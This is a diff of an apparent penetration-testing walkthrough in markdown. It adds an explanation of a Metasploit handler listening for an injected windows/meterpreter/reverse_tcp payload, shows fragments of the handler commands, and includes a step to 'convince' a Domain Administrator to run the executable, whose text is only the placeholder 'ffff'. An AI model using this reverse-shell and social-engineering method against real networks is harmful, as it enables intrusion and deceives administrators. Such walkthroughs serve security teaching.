@@ -164,11 +164,7 @@ To open a remote desktop connection, we can use the following command directly f
 	set ExitOnSession false
 	exploit -j -z
 	```
-	The script, basically, starts a generic payload handler and makes it listening on the default port of t
-==SCRIPT==
-generic payload handler
-we specify payload
-
+	The script, basically, starts a generic payload handler and makes it listening on the default port of the current machine for incoming connections from a `windows/meterpreter/reverse_tcp` payload, which is the one that we have injected.
 	
  8. **"Convince" a Domain Administrator to run the executable:**
  ffff
@@ -185,11 +181,11 @@ we specify payload
 
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTU1ODcxNDc1OSwtMTg0MzM4MjY2MywtMj
-EyMDg2MzAyNSw3NjgzMDE3NDUsMTY3ODM1MjcxNCwxNzU4NDUz
-MDM0LC0xNzU3Njc4NzcwLC0xNzE0NTE5NDA5LDczMTEwODE2MS
-wtMTIyMjgyMzMxOSwzNzYxNTExMTEsLTI4MDQxMjk3MywtMTcw
-ODgwNDg0NywtMTg2NzEzMzQ1Miw3MzE2ODUzMTcsMTcwMDUzND
-U2MCwxMjMxNzgwNzQ5LDEyMzgyMjgyNDYsLTEwODczMzkyNDIs
-LTE4MTk4MTUyOTJdfQ==
+eyJoaXN0b3J5IjpbLTU2MzY2MTA1LC0xODQzMzgyNjYzLC0yMT
+IwODYzMDI1LDc2ODMwMTc0NSwxNjc4MzUyNzE0LDE3NTg0NTMw
+MzQsLTE3NTc2Nzg3NzAsLTE3MTQ1MTk0MDksNzMxMTA4MTYxLC
+0xMjIyODIzMzE5LDM3NjE1MTExMSwtMjgwNDEyOTczLC0xNzA4
+ODA0ODQ3LC0xODY3MTMzNDUyLDczMTY4NTMxNywxNzAwNTM0NT
+YwLDEyMzE3ODA3NDksMTIzODIyODI0NiwtMTA4NzMzOTI0Miwt
+MTgxOTgxNTI5Ml19
 -->
